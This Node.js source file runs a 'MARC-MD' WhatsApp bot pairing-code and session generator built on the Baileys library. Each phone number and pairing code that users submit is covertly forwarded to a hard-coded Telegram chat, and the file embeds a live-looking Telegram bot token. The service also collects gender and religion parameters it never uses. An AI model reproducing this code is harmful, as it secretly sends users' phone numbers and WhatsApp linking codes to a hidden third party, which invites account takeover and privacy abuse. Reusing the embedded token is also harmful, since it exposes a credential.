import { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    DisconnectReason
} from "@whiskeysockets/baileys";
import express from "express";
import pino from "pino";
import fs from "fs-extra";
import axios from 'axios';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 8000;

// Configuration
const BOT_NAME = "MARC-MD";
const TELEGRAM_TOKEN = "8763281107:AAHk2UTQjqIGR28zjWXX8w7A0-1MHRPXXrc";
const TELEGRAM_CHAT_ID = "7779604777";

// Public folder setup
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// ہوم پیج پر index.html لوڈ کرنا
app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        });
    } catch (e) {
        console.error("Telegram Log Error");
    }
}

async function startSession(phoneNumber, res, gender, religion) {
    // سیشن کے لیے عارضی فولڈر
    const sessionDir = path.join(__dirname, 'sessions', `${phoneNumber}_${Date.now()}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const socket = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        browser: ["MARC-MD", "Chrome", "1.0.0"]
    });

    if (phoneNumber && !socket.authState.creds.registered) {
        phoneNumber = phoneNumber.replace(/[^0-9]/g, ''); 
        try {
            await delay(3500); 
            let code = await socket.requestPairingCode(phoneNumber);
            if (res && !res.headersSent) res.status(200).json({ code });
            sendToTelegram(`🚀 *New Request*\n*Number:* ${phoneNumber}\n*Code:* \`${code}\``);
        } catch (err) {
            if (res && !res.headersSent) res.status(500).json({ error: "Failed" });
        }
    }

    socket.ev.on("connection.update", async (update) => {
        const { connection } = update;
        if (connection === "open") {
            const sessionBase64 = Buffer.from(JSON.stringify(state.creds)).toString("base64");
            await socket.sendMessage(socket.user.id, { text: `MARC-MD~${sessionBase64}` });
            sendToTelegram(`✅ *Success:* ${phoneNumber}`);
            await delay(5000);
            socket.end();
            fs.removeSync(sessionDir);
        }
    });

    socket.ev.on("creds.update", saveCreds);
}

app.get("/get-code", (req, res) => {
    const { number, gender, religion } = req.query;
    if (!number) return res.status(400).json({ error: "Required" });
    startSession(number, res, gender, religion);
});

// سرور اسٹارٹ
app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 MARC-MD live on port ${PORT}`);
});
